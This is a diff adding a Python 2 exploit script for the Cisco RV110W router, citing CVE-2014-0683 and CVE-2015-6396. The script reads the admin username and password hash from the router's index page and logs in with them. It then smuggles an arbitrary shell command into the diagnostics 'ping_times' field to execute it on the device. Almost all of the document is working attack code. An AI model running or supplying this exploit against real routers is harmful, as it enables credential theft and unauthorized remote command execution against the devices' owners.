@@ -1,0 +1,98 @@
+#!/usr/bin/env python2
+
+#####
+## Cisco RV110W Password Disclosure and OS Command Execute.
+### Tested on version: 1.1.0.9 (maybe useable on 1.2.0.9 and later.)
+
+# Exploit Title: Cisco RV110W Password Disclosure and OS Command Execute
+# Date: 2018-08
+# Exploit Author: RySh
+# Vendor Homepage: https://www.cisco.com/
+# Version: 1.1.0.9
+# Tested on: RV110W 1.1.0.9
+# CVE : CVE-2014-0683, CVE-2015-6396
+
+import os
+import sys
+import re
+import urllib
+import urllib2
+import getopt
+import json
+
+import ssl
+
+ssl._create_default_https_context = ssl._create_unverified_context
+
+###
+# Usage: ./{script_name} 192.168.1.1 443 "reboot"
+###
+
+if __name__ == "__main__":
+    IP = argv[1]
+    PORT = argv[2]
+    CMD = argv[3]
+    
+    # Get session key, Just access index page.
+    url = 'https://' + IP + ':' + PORT + '/'
+    req = urllib2.Request(url)
+    result = urllib2.urlopen(req)
+    res = result.read()
+    
+    # parse 'admin_pwd'! -- Get credits
+    admin_user = re.search(r'.*(.*admin_name=\")(.*)\"', res).group().split("\"")[1]
+    admin_pwd = re.search(r'.*(.*admin_pwd=\")(.{32})', res).group()[-32:]
+    print "Get Cred. Username = " + admin_user + ", PassHash = " + admin_pwd
+
+    # Get session_id by POST
+    req2 = urllib2.Request(url + "login.cgi")
+    req2.add_header('Origin', url)
+    req2.add_header('Upgrade-Insecure-Requests', 1)
+    req2.add_header('Content-Type', 'application/x-www-form-urlencoded')
+    req2.add_header('User-Agent',
+                    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)')
+    req2.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
+    req2.add_header('Referer', url)
+    req2.add_header('Accept-Encoding', 'gzip, deflate')
+    req2.add_header('Accept-Language', 'en-US,en;q=0.9')
+    req2.add_header('Cookie', 'SessionID=')
+    data = {"submit_button": "login",
+            "submit_type": "",
+            "gui_action": "",
+            "wait_time": "0",
+            "change_action": "",
+            "enc": "1",
+            "user": admin_user,
+            "pwd": admin_pwd,
+            "sel_lang": "EN"
+            }
+    r = urllib2.urlopen(req2, urllib.urlencode(data))
+    resp = r.read()
+    login_st = re.search(r'.*login_st=\d;', resp).group().split("=")[1]
+    session_id = re.search(r'.*session_id.*\";', resp).group().split("\"")[1]
+
+    # Execute your commands via diagnose command parameter, default command is `reboot`
+    req3 = urllib2.Request(url + "apply.cgi;session_id=" + session_id)
+    req3.add_header('Origin', url)
+    req3.add_header('Upgrade-Insecure-Requests', 1)
+    req3.add_header('Content-Type', 'application/x-www-form-urlencoded')
+    req3.add_header('User-Agent',
+                    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)')
+    req3.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
+    req3.add_header('Referer', url)
+    req3.add_header('Accept-Encoding', 'gzip, deflate')
+    req3.add_header('Accept-Language', 'en-US,en;q=0.9')
+    req3.add_header('Cookie', 'SessionID=')
+    data_cmd = {"submit_button": "Diagnostics",
+            "change_action": "gozila_cgi",
+            "submit_type": "start_ping",
+            "gui_action": "",
+            "traceroute_ip": "",
+            "commit": "1",
+            "ping_times": "3 |" + CMD + "|",
+            "ping_size": "64",
+            "wait_time": "4",
+            "ping_ip": "127.0.0.1",
+            "lookup_name": ""
+            }
+    r = urllib2.urlopen(req3, urllib.urlencode(data_cmd))
